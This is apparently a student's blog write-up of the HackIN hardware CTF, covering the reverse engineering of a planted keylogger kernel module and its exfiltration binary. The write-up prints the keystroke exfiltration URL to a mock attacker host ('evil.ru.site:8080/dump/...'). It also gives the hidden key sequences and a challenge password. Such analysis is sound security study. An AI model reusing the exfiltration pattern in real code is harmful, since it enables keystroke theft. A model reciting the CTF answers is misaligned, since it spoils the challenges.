---
title: HackIN CTF
date: 2020-10-09 13:07:22 -0400
categories: [CTF , Hardware CTF]
tags: [ctf, hardware, kernel, linux, malware]
---

# Intro
Recently, I competed in a CTF hosted by Booz Allen Hamilton and sponsored by NAVSEA and IN3 to name a few. I found out about the CTF through a social media post and a flyer that was sent throughout the University of Louisville Computer Science Department. I registered and told some of my friends although many of the students at UofL have any interest in CTFs or Security I managed to get a few students to join. Since the event was completely virtual, we were sent a Slack invite to a group chat with all the other members. Although some students from my school decided to join, I decided to meet some new people and find a group. The group I joined was comprised of students, each from a different school. A couple of the members of the group were electrical engineering majors and the other member was a computer science major. The group I joined have either never played in a CTF or have once before so I knew it would be interesting to see how we work together and share ideas to solve the problems. I will be going over the problems I solved but will vaguely discuss the problems my teammates solved.

<img src="/assets/img/post/2020-10-09-hackin-ctf/HackIN-11.jpeg" style="width: 75%" >

# A Week Out
About a week out I received the hardware needed for the competition and in the package was a micro-USB cable, USB stick, and a custom PBC board with keyboard keys and an Arduino Pro Micro attached to the board. On the USB stick was a password protected zip folder that contained a virtual box VM. I knew from previous projects that boards like the Arduino Leonardo and Pro Micro can emulate HID’s (Human-Interface Devices) such as a keyboard or mouse. But the keys on the board were not marked so it made me curious. What was running on the board? What key commands does it send? So, I began to test this using the `showkey` command in Linux which allows to you to see the values sent by the keys. There are other tools on Linux that can do something similar like `xbindkeys`, etc, but for now showkeys worked. I mapped out the keys and took note of it as shown below:

<img src="/assets/img/post/2020-10-09-hackin-ctf/HackIN-Keys.png" style="width: 75%" >

I noticed there was a key that did not send anything, so I was curious if it was used as a key-combo. I held the key down and began to click through each of the key and to my surprise I was right. There was a key-combo that allowed the user to send `up,down, left, right, "a", and "b"`

# The Competition Begins!
Our group already had a plan and had our VMs up and running. We immediately split up into solving challenges that best suit our skill set. There was a category called "Hardware" that my teammates solved. In order to retreive all the flags for that category, you’re required to dump the firmware of the device. We used `avrdude` then you had to open the file in Ghidra to do some more analysis. The challenges in this category also asked about general info about the device such as the number of general-purpose registers, number of digital pins, dump EEPROM, ect. We used the instruction manual to solve many of the flags too. Many of these could have been solved prior to this, but we had no idea going in that we would have to dump the firmware.

I logged into the CentOS VM and did some light recon of enumerating through the directories for any odd files or process info on the VM. I did not find anything that stood out, so I ventured to plug in the keypad given to us. This time, after doing some more recon, I noticed that there were some new files in the `/tmp` folder. One was a `. pid` file so I knew that the keypad was linked to some kind of process.

<img src="/assets/img/post/2020-10-09-hackin-ctf/HackIN-1.png" style="width: 75%" >

When I ran `ps aux` there did not seem to be anything currently running. So, to combat this I unplugged my keypad and noticed that it shut down my VM. I brushed it off and moved and started everything back up I ran `watch ps aux` to watch for any processes that start up when the device is plugged in and sure enough there was.

<img src="/assets/img/post/2020-10-09-hackin-ctf/HackIN-2.png" style="width: 75%" >

# Digging Deeper into the Kernel
One of the challenges stated:

```
Identify the kernel module handling the keypad in the .ova image.
```

Now that we know what is running, we can begin to piece things together. So, I started to look for the suspicious kernel modules and out of luck; I tried grepping for "HackIN" since that’s the name of the CTF and to my surprise, I found something of interest.

<img src="/assets/img/post/2020-10-09-hackin-ctf/HackIN-3.png" style="width: 75%" >

We can view the file location and info about it using `modinfo HackIN_HID`. The next few challenges directed me to reverse engineer the module and figure out if it does anything else. I was having some issues with VirtualBox drag'n'drop feature since my daily driver is Kubuntu I could simply send over the file using netcat. I setup a listener on my host and sent the file from the VM to my host IP and port.

Now that the file is on our system, we can now open this in Ghidra to reverse engineer it. After importing it into Ghidra and analyzing it, I began first by searching for any strings. Sure enough, there were some interesting strings which led me to find more flags.

<img src="/assets/img/post/2020-10-09-hackin-ctf/HackIN-4.png" style="width: 75%" >

A lot of the strings stuck out, but the most interesting ones were the top two strings: `/bin/explorer.exe` and `netfilter_lkm`.

We recognized the explorer.exe file from one of the processes that were running on the system so this may be helpful later. When you double-click on it, then right-click on the memory address you can search for references to that string. This brought me to this function called `hid_hackin_probe`

<img src="/assets/img/post/2020-10-09-hackin-ctf/HackIN-5.png" style="width: 75%" >

We can clearly see that this kernel module calls for a helper called `/bin/explorer.exe`, but it also requests another module called `netfilter_lkm`. So then what does `netfilter_lkm` do?

Once I sent the kernel module over to my host system and loaded that into Ghidra, I started looking at the strings for anything interesting again. We hit gold again! This time, an IP address: `175.129.12.94` which I presume is being connected to.

<img src="/assets/img/post/2020-10-09-hackin-ctf/HackIN-6.png" style="width: 75%" >

Now, let us view where this string is referenced: On the left-hand side of Ghidra, in the Symbol Tree panel, we can search for any functions that we would like to look at. One of the things that struck my attention was the `kernel_power_off` and `nf_register_net_hook`. These are Linux kernel functions and are used in our malicious kernel module. The function `nf_register_net_hook` is used in the netfilter.h library. We used Bootlin to help us understand the kernel functions being called. MORE INFO [HERE](https://elixir.bootlin.com/linux/v4.10/source/include/linux/netfilter.h#L156) and [HERE](https://elixir.bootlin.com/linux/latest/source/kernel/reboot.c#L287)

<img src="/assets/img/post/2020-10-09-hackin-ctf/HackIN-7.png" style="width: 75%" >

When we look at where these functions are called, we can see they are called in the initialization of our kernel module. Without going into detail, we can see that when some condition is not met then it sends a power off. This must be why our VM shuts down when we unplug the keypad.

<img src="/assets/img/post/2020-10-09-hackin-ctf/HackIN-8.png" style="width: 75%" >

After digging into the linux kernel a bit more, we can see that `nf_register_net_hook` accepts two parameters passed into it which are structs.

<img src="/assets/img/post/2020-10-09-hackin-ctf/HackIN-9.png" style="width: 75%" >

Looking back at our decompiled code, we can see the variables that are passed. The variable `puVar3` is assigned some address. If we double-click on that it will lead us to some jumbled data that we can assume is our `nf_hook_ops` struct data. We can right-click on the address and disassemble it and now we can see where our IP address we found in the strings is being used.

<img src="/assets/img/post/2020-10-09-hackin-ctf/HackIN-10.png" style="width: 100%" >

I was also curious to see if the IP address resolves to anything in our `/etc/resolv.conf` file and it does. It resolves to `evil.ru.site`

We can come back to this module little later, but for now let us

find other artifacts that may be left behind

# UDEV Rules!
Now that we know what the basic idea what the kernel module is doing we can now piece that together with what is actual process is running on the system by reviewing the files we found on start up.

<img src="/assets/img/post/2020-10-09-hackin-ctf/HackIN-2.png" style="width: 75%" >

We can start by looking at `/bin/connected.sh`

<img src="/assets/img/post/2020-10-09-hackin-ctf/HackIN-13.png" style="width: 100%" >

We can see that the connected script logs when the device was connected into `/tmp/maypad_scripts.log`. The command after that essentially passes `event6` to `/bin/exfilpad`. I'm a bit familiar with the Linux filesystem so I instantly recognized this as a device file possibly in `/dev/input/`. Without digging into `/bin/exfilpad` we can assume that the exfilpad reads the input from the `/dev/input/event6` device file of the keypad and interprets it.

<img src="/assets/img/post/2020-10-09-hackin-ctf/HackIN-14.png" style="width: 100%" >
<img src="/assets/img/post/2020-10-09-hackin-ctf/HackIN-15.png" style="width: 100%" >

We never found where `/bin/connected.sh` is triggered to execute since it is not called by the kernel module. I decided to check `/etc/udev/rules.d/`. This is where you can setup rules to process a device. In the file there were two rules for the keypad. When the device was plugged in it ran `connected.sh` and when it was unplugged it executes `disconnected.sh`.

<img src="/assets/img/post/2020-10-09-hackin-ctf/HackIN-12.png" style="width: 100%" >

# Whats the Secret Code?
Okay, now we know what the kernel modules are doing on the system, but what exactly does the binaries like `explorer.exe` and `exfilpad` do? One of the challenges says:
```
Code? Secret Activation Keys? Backdoor?
Figure out the correct sequence of keys to execute the program's hidden modes.
Submit the sequence as the answer.
```
We can assume that the keypad has some special key combo that is used to unlock something. We can start by looking at `exfilpad` since we already know that the input device file id is passed to it. Looking at the main, we can see some interesting functions. The one we are going to focus on is `read_maypad()`, but before we go any further, we need to see what is being passed to that function. It looks like the `local_118` an empty char array of size 268 is passed to `fgets` which reads the standard input from the terminal and saves it into `local_118`. Which we presume `event6` is passed to the standard input via `connected.sh`

<img src="/assets/img/post/2020-10-09-hackin-ctf/HackIN-16.png" style="width: 60%" >

Let me break down what exactly happens here:

First, I am going rename the variables with bad name conventions, but it should be easy to follow along. We can see that `event6` is passed into `read_maypad`. Then on lines 24 and 25 if converted to ascii then it is the directory of event6 which is `/dev/input/`. All this is then concatenated into the variable we named called `dir_event6_p1` then the file descriptor is returned showing that we can properly open the file.

<img src="/assets/img/post/2020-10-09-hackin-ctf/HackIN-17.png" style="width: 60%" >

The next part of the function is where it gets interesting. For some reason, Ghidra cannot properly analyze the array, but from lines 35 to 44 we can assume that is all one array. If someone knows a better way to fix this in Ghidra, let me know (I’ll explain why we can assume this later). So the while loop starting at line 46 checks to see if the file descriptor is valid and reads the input from the `/dev/input/event6` and compares it to the array of hex which we can actually convert to decimal since we learned earlier from the `showkey` command in Linux it returns the decimal of the key or you could use this [site](http://cherrytree.at/misc/vk.htm). Then on line 55, we can see that it checks to see if the user inputs the correct 10 keys and sets the variable `index_arr` to 0, which will be used later.

<img src="/assets/img/post/2020-10-09-hackin-ctf/HackIN-18.png" style="width: 60%" >

For the sake of time I used this [site](http://cherrytree.at/misc/vk.htm) to find out the decimal values that map to keys.
```
Hex Array of Key combo:
 67  67  6c  6c  69  6a  69  6a 30 1e

Converted to Decimal:
103 103 108 108 105 106 105 106 48 30

Corresponding Keys:
UP, UP, DOWN, DOWN, LEFT, RIGHT, LEFT, RIGHT, b, a
```

The next challenge is to find the kill switch key combo that stops everything. If we scroll down a little more, we can see a similar instance of reading the keys and comparing them to something. We do not have to look any further than line 71 to see that the string, `aaa`, is the kill switch. Just to ensure I was not missing anything along the way, I searched for strings and found an easy flag in plaintext.

<img src="/assets/img/post/2020-10-09-hackin-ctf/HackIN-19.png" style="width: 75%" >

Another piece of code that caught my attention was on line 72 in a function called `connect_site`. When you double-click on it and view the decompiled code, you can see right away that on line 17 our keystrokes are being sent to `"evil.ru.site:8080/dump/time=%d&keystroke=%s"`

<img src="/assets/img/post/2020-10-09-hackin-ctf/HackIN-20.png" style="width: 75%" >

What now? Well now we test to see what happens if we manually execute `explorer.exe`. It seems to start a server on port 8080 so when you navigate to `evil.ru.site:8080` in the browser you can see this:

<img src="/assets/img/post/2020-10-09-hackin-ctf/HackIN-21.png" style="width: 75%" >

BUT WHAT DOES IT MEAN? ... I was not sure honestly... But what happens if we navigate to `/dump` directory that we found in the `connect_site` function? We get this:

<img src="/assets/img/post/2020-10-09-hackin-ctf/HackIN-22.png" style="width: 75%" >

After doing some searching, we found a logs folder in the same place as explorer.exe which contained files that with the same name as what was displayed in the browser. We played around with the server and the exfilpad binary some more, then noticed that pressing the keys generates the files. When you open one of the files in the logs folder it looks empty, but it’s not.

```
DISCLAIMER: At this point, our team stopped so we were unable to figure out what exactly was happening in the log files.
After the competition, I was told that when viewed in VIM there are a bunch of ASCII periods separated by one whitespace.
If you compare two of the log files you can see that the top and bottom are the same in all log files and the only thing that changes is the middle.
Somehow, you can able to use a Vigenere cipher and other methods to figure out the key.
```

Although we couldn't figure out the logs file, we managed to get two more flags before the competition ended. The next challenge said:

```
"HTTP Dir Busting" : We need to determine some of the functionality of the server.
A co-worker started writing an application to test server endpoints/directories, but quickly
noticed some server "funny business" and went home early. Please finish writing the script
and report back with a list of valid server endpoints (URLs).
Please see the included python file and wordlist in the challenges folder.
```
I used [dirsearch](https://github.com/maurosoria/dirsearch) to exclude the unnecessary responses that returned "Don't Exploit me, bro" and obtain a list of valid endpoints.

<img src="/assets/img/post/2020-10-09-hackin-ctf/HackIN-24.png" style="width: 75%" >

VALID ENDPOINTS:
```
evil.ru.site:8080/
evil.ru.site:8080/about
evil.ru.site:8080/admin/login
evil.ru.site:8080/cgi-bin/index.pl
evil.ru.site:8080/dump
evil.ru.site:8080/dump.inc
evil.ru.site:8080/dump.inc.old
evil.ru.site:8080/dump.log
evil.ru.site:8080/dump.old
evil.ru.site:8080/dump.rar
evil.ru.site:8080/dump.rdb
evil.ru.site:8080/dump.sql
evil.ru.site:8080/dump.sql.old evil.ru.site:8080/dump.sqlite
evil.ru.site:8080/dump.tar
evil.ru.site:8080/dump.tar.bz2 evil.ru.site:8080/dump.tar.gz
evil.ru.site:8080/dump.tgz
evil.ru.site:8080/dump.zip
evil.ru.site:8080/dumpenv
evil.ru.site:8080/dumper
evil.ru.site:8080/dumps
evil.ru.site:8080/dumpuser
evil.ru.site:8080/dumpuser.aspx
evil.ru.site:8080/dump.7z
evil.ru.site:8080/list
evil.ru.site:8080/phpMyAdmin-3.3.4/
evil.ru.site:8080/kill
```

We also noticed that there was some "bad programming" going on in the server request and response. There was a `isAdmin:` parameter in the response that was empty. So, if we added this to the header of our request we could see if we would get a response. We were able to modify the header and get the flag.

<img src="/assets/img/post/2020-10-09-hackin-ctf/HackIN-23.png" style="width: 75%" >


# Winners!!!!
The CTF closed and our team placed 3rd for a $1000 cash prize that will be split between each team member.

<img src="/assets/img/post/2020-10-09-hackin-ctf/HackIN-25.jpeg" style="width: 75%" >

# Conclusion
Although our team met the day before the competition, we worked really well together . It was interesting to learn about each team member’s background, especially about their majors. Overall, this is one of the most interesting and fun CTF I have done in a while. I was able to meet some great people with diverse backgrounds and we happened to come in 3rd to win a cash prize. Although the money is nice it was great to learn, meet new people, and just have fun doing what we are passionate about. I look forward to next year’s competition.

# Extra

There were some interesting challenges that hardly any other team managed to solve and that was the two "RISC-V" challenges. One of our team members managed to solve it though. We were given a binary that was developed using RISC-V. The binary requested a password and we had to figure out what exactly was the password was to get the flag. There were multiple arrays that contained pieces of a password is would compare each char from the user input to the corresponding array with the password pieces.

For those in the competition and still have the binary file the password was: `Lucky7h1r733n`

There were a couple more challenges that appeared after we solved the RISC-V challenges, but we didn't have enough time to view it.